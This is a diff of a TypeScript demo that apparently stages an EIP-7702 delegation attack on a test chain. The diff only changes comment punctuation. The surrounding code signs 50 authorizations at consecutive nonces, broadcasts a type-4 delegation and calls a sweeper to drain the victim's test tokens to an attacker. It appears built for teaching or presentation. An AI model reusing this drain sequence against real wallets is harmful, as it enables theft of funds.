@@ -8,7 +8,7 @@ import type { Emit } from "./types";
 const NUM_AUTHS = 50;
 const DEC = 6;
 
-// Real attack on anvil finishes in ~100ms — too fast to watch. Pace the stream so the
+// Real attack on anvil finishes in ~100ms, too fast to watch. Pace the stream so the
 // sequence is presentable. The on-chain actions are unchanged; only the emit cadence is paced.
 // Set ATTACK_PACE_MS=0 to disable (e.g. on Sepolia, where block times pace it naturally).
 const PACE = Number(process.env.ATTACK_PACE_MS ?? 26);
@@ -21,7 +21,7 @@ const MIN_STEP_MS = Number(process.env.ATTACK_MIN_STEP_MS ?? 4000);
 
 function env(k: string) {
   const v = process.env[k];
-  if (!v) throw new Error(`Missing ${k} — run \`npm run setup\` (local) or configure .env (Sepolia).`);
+  if (!v) throw new Error(`Missing ${k}, run \`npm run setup\` (local) or configure .env (Sepolia).`);
   return v;
 }
 
@@ -74,13 +74,13 @@ export async function runAttack(emit: Emit, signal?: AbortSignal, chainId?: numb
   // nothing to drain, so stop early and tell the user to top up first.
   const before = (await pub.readContract({ address: tusd, abi: ERC20_ABI, functionName: "balanceOf", args: [victim.address] })) as bigint;
   if (before === 0n) {
-    E({ step: "empty", msg: "The wallet is empty — press Deposit to add test tUSD, then launch the attack." });
+    E({ step: "empty", msg: "The wallet is empty, press Deposit to add test tUSD, then launch the attack." });
     return;
   }
   E({ step: "before", msg: "Victim balance before attack", victimTUSD: formatUnits(before, DEC), attackerTUSD: "0" });
   abortIf();
 
-  // 1 — sign 50 authorizations at consecutive nonces
+  // 1, sign 50 authorizations at consecutive nonces
   const start = await pub.getTransactionCount({ address: victim.address });
   await holdStep(); // step 1 begins
   E({ step: "sign", msg: `Victim current nonce is ${start}. Signing ${NUM_AUTHS} authorizations at nonces ${start}..${start + NUM_AUTHS - 1}`, victimNonce: start, numAuths: NUM_AUTHS });
@@ -93,7 +93,7 @@ export async function runAttack(emit: Emit, signal?: AbortSignal, chainId?: numb
   E({ step: "sign-done", msg: `All ${NUM_AUTHS} authorizations signed. Exactly one (nonce ${start}) matches and takes effect.`, matchingNonce: start });
   abortIf();
 
-  // 2 — relayer broadcasts the delegation (victim nonce only advances via the authorization)
+  // 2, relayer broadcasts the delegation (victim nonce only advances via the authorization)
   await holdStep(); // step 2 begins (step 1 held ≥ MIN_STEP_MS)
   E({ step: "delegate", msg: "Relayer broadcasting type-4 transaction carrying all 50 authorizations..." });
   const dHash = await wallet.sendTransaction({ authorizationList: auths, to: victim.address, data: "0x" });
@@ -101,7 +101,7 @@ export async function runAttack(emit: Emit, signal?: AbortSignal, chainId?: numb
   const dRc = await pub.waitForTransactionReceipt({ hash: dHash });
   E({ step: "delegate-mined", msg: "Delegation mined", block: Number(dRc.blockNumber), status: dRc.status });
 
-  // Poll getCode until the read RPC reflects the delegation — public RPCs are eventually consistent,
+  // Poll getCode until the read RPC reflects the delegation, public RPCs are eventually consistent,
   // so a confirmed receipt doesn't mean the next getCode shows the new code.
   let code = await pub.getCode({ address: victim.address });
   let delegated = !!code && code.toLowerCase().startsWith("0xef0100");
@@ -115,7 +115,7 @@ export async function runAttack(emit: Emit, signal?: AbortSignal, chainId?: numb
   if (!delegated) { E({ step: "error", msg: "Delegation did not take effect (check CHAIN_ID / nonce / RPC supports type-4)." }); return; }
   abortIf();
 
-  // 3 — drain
+  // 3, drain
   await holdStep(); // step 4 begins (step 3 held ≥ MIN_STEP_MS)
   E({ step: "sweep", msg: "Calling sweeper to drain victim tUSD to attacker..." });
   const sData = encodeFunctionData({ abi: SWEEPER_ABI, functionName: "sweepToken", args: [tusd] });
